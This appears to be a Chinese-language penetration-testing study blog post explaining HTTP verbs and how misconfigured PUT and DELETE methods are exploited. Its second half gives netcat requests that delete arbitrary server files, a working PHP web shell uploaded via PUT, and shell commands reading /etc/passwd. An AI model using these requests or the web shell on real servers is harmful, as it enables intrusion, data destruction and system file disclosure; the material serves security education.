---
layout: post
title: "HTTP Verbs"
date: "2022-06-26"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Web Attacks
---

# HTTP Verbs
这如何支持我的渗透测试生涯？
* 能够手动利用配置错误的 Web 服务器
* 涵盖的攻击也可用于针对嵌入式设备
* 能够创建自定义 PHP shell

您已经在 Web 应用程序模块中遇到过 HTTP 动词或方法。
在下面的幻灯片中，您将了解有关它们的更多信息以及如何在渗透测试期间利用它们。

最常见的 HTTP 方法是：
* GET
* PUT
* POST
* DELETE
* HEAD
让我们详细看看它们！

## GET
GET 用于请求资源。 当用户想要打开一个网页时，浏览器会发送一个 GET 请求。

```
GET /page.php HTTP/1.1
Host: www.example.site
```

GET 还可以将**参数**传递给 Web 应用程序。
要将“course=PTS”传递给 page.php，请求将是：

```
GET /page.php?course=PTS HTTP/1.1
Host: www.example.com
```
## POST
**POST** 用于提交 HTML 表单数据。 POST 参数必须在**消息正文**中。

```
POST /login.php HTTP/1.1
Host: www.example.site

username=john&password=mypass
```

## HEAD
如您之前所见，**HEAD** 与 GET 非常相似，因为它只询问响应的标头而不是响应正文。

```
HEAD / HTTP/1.1
Host: www.example.site
```
## PUT
**PUT** 用于将文件**上传**到服务器。 可以想象，如果允许并且配置错误，这是一个非常危险的功能。

```
PUT /path/to/destination HTTP/1.1
Host: www.example.com

<PUT data>
```

## DELETE
**DELETE** 用于从服务器中**删除**文件； 这是另一个必须明智配置的功能，因为误用 DELETE 会导致拒绝服务和数据丢失。

```
DELETE /path/to/destination HTTP/1.1
Host: www.example.site
```

## OPTIONS
**OPTIONS** 用于向 Web 服务器查询启用的 HTTP 动词。

```
OPTIONS / HTTP/1.1
Host: www.example.site
```

### REST APIs
您应该知道称为 **REST APIs** 的 Web 应用程序的存在。
对于那些对它的含义感到好奇的人，它意味着代表性状态转移应用程序编程接口。

**REST APIs** 是一种特定类型的 Web 应用程序，它强烈依赖于几乎所有 **HTTP 动词**。
它们通常被称为 **“Web 服务”**或简称为 **“APIs”**。

由于这些应用程序严重依赖所有 **HTTP 动词**，因此您可以期望它们具有颠覆性的功能。
此类应用程序通常使用 **“PUT”来保存数据**而不是保存文件。

在您报告在渗透测试期间发现 **“PUT / DELETE”** 方法之前，您应该两次确认其确切影响。
有时很容易混淆 **REST API** 的 **PUT** 方法，它只是使用允许我们创建任意文件的 **PUT** 方法创建新内容。

发出 **PUT 请求**后，您应该尝试查找您创建的文件是否存在。

## Using HTTP 1.0 Syntax
正如您在前面的示例中看到的，使用 HTTP 1.1 语法意味着还要在您的请求中发送一个 `Host:` 标头。如果您使用 HTTP 1.0，则可以跳过 `Host:` 标头。

```
OPTIONS / HTTP/1.0
```

请注意，有时启用的 HTTP 动词取决于您正在探测的主机名！

## Exploiting Misconfigured HTTP Verbs（利用配置错误的HTTP动词）
现在您已经知道如何使用一些 HTTP 动词，是时候看看如何使用它们来利用配置错误的 Web 服务器了。
首先，渗透测试者必须列举可用的方法或动词。

### Enumeration with OPTIONS
您可以通过使用 Netcat 发送 OPTIONS 消息来做到这一点。

```
nc victim.site 80
OPTIONS / HTTP/1.0

HTTP/1.1 200 OK
Date: Tue, 27 Jan 2015 13:30:56 GMT
Server: GET,HEAD,POST,PUT,DELETE,OPTIONS
Vary: Accept-Encoding
Content-Length: 0
Connection: close
Content-Type: text/html
```
### Exploiting DELETE
要利用 DELETE 动词，您只需指定要从服务器中删除的文件；这显示了未经身份验证的 DELETE 方法如何删除服务器上的任意资源。

```
nc victims.site 80
DELETE /path/to/resource.txt HTTP/1.0

HTTP/1.1 200 OK
Date: Tue, 27 Jan 2015 13:37:19 GMT
Server: Apache/2.2.22 (Debian)
Vary: Accept-Encoding
Connection: close
```

在这里，我们看到一个删除登录页面的示例，从而使每个用户都无法登录。
```
nc victim.site 80
DELETE /login.php HTTP/1.0

HTTP/1.1 200 OK
Date: Tue, 27 Jan 2015 13:37:19
Server: Apache/2.2.22 (Debian)
Vary: Accept-Encoding
Connectin: close
```

### Exploiting PUT
利用 PUT 方法更加**复杂**，因为您必须知道要在服务器上上传的文件的大小。为此，您可以使用 Unix 实用程序 wc（字计数器）及其 `-m` 参数来计算有效负载的长度（以字节为单位）。

```
wc -m payload.php
20 payload.php
```

然后，您可以使用获得的大小来构建 PUT 消息。在以下示例中，您将了解如何上传显示有关服务器上 PHP 安装信息的页面。

```
nc victim.site 80
PUT /payload.php HTTP/1.0
Content-type: text/html
Content-length: 20

<?php phpinfo(); ?>
```

### Uploading a PHP Shell with PUT
让我们看看如何编写一个 shell 并通过 **PUT** 将其上传到受害者服务器。
首先，我们来分析一下shell代码。

以下代码包含一个小而有效的 PHP shell。

```php
<?php
if (isset($_GET['cmd'])) # Runs the following code only if the GET cmd parameter is set. 仅当设置了 GET cmd 参数时才运行以下代码。
{
    $cmd = $_GET['cmd']; # Reads the command to execute. 读取要执行的命令。
    echo '<pre>';
    $result = shell_exec($cmd); # Runs the command by using the OS shell. 使用 OS shell 运行命令。
    echo $result; # Displays the output of the command. 显示命令的输出。
    echo '</pre>';
}
?>
```

您可以通过 cmd GET 参数传递您的命令来使用它。
在下面的示例中，我们通过要求 shell 执行 `ls` 命令来列出当前目录的内容。

```
victim.site/shell.php?cmd=ls

admin
css
data
index.html
js
login.php
shell.php
```

shell 与运行它的 web 服务器具有相同的权限。例如，我们可以写一个文件。

```
victim.site/shell.php?cmd=echo 'test string' > /tmp/testfile
```

我们也可以读取它。

```
victim.site/shell.php?cmd=cat /tmp/testfile

test string
```

而且，我们甚至可以读取系统文件。

```
victim.site/shell.php?cmd=cat /etc/passwd

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

请记住，PUT 要求我们传递内容长度。所以我们必须知道shell大小：

```
wc -m shell.php
136 shell.php
```
然后我们可以构建一个有效的 PUT 请求。

```
nc victim.site 80
PUT /payload.php HTTP/1.0
Content-type: text/html
Content-length: 136

<?php
if (isset($_GET['cmd']))
{
    $cmd = $_GET['cmd'];
    echo '<pre>';
    $result = shell_exec($cmd);
    echo $result;
    echo '</pre>';
}
?>
```

## Conclusions
错误配置的 HTTP 动词在 Web 服务器中变得越来越少。这是因为 Web 技术的发展和更好的默认配置文件。
另一方面，您仍然可以在**嵌入式设备、IP 摄像机、数字视频录像机**和其他“智能”设备中发现很多配置错误的 HTTP 方法。